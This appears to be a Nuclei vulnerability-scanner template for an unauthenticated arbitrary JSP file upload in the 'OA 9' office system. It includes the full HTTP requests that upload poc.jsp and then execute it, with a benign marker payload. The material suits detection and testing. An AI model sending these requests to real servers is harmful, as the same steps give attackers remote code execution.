# Nuclei Template: OA 9 - Arbitrary File Upload
**Template ID:** oa-v9-uploads-file
**Vulnerability Class:** Code Injection
**Severity:** High
**CWE:** CWE-94
**Source:** Nuclei Template (`oa-v9-uploads-file.yaml`)

## Vulnerability Information & PoC

## Description
OA 9 is susceptible to arbitrary file upload via the uploadOperation.jsp endpoint. These files can be subsequently called and are executed by the remote software, and an attacker can obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

## Steps to reproduce / Exploit Payload
```http
POST /page/exportImport/uploadOperation.jsp HTTP/1.1
Host: {{Hostname}}
Origin: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo

------WebKitFormBoundaryFy3iNVBftjP6IOwo
Content-Disposition: form-data; name="file"; filename="poc.jsp"
Content-Type: application/octet-stream

<%out.print(2be8e556fee1a876f10fa086979b8c7c);%>
------WebKitFormBoundaryFy3iNVBftjP6IOwo--

GET /page/exportImport/fileTransfer/poc.jsp HTTP/1.1
Host: {{Hostname}}
```

## References
- https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
